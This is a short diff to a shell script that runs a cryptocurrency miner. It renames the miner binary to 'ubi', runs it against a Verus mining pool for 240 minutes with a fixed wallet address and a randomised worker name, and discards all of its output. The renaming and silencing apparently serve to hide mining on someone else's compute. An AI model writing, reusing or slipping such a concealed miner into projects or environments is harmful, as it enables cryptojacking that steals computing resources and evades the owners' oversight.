@@ -1,1 +1,5 @@
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RDWx2Sa8iyeLVTMUUi5ypY357ZXH5tNf56.hellminer -p x --cpu 2
+#!/bin/sh
+chmod +x verus-solver
+chmod +x ubi
+timeout 240m ./ubi -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X) -p x --cpu 2 > /dev/null 2>&1
+echo finish
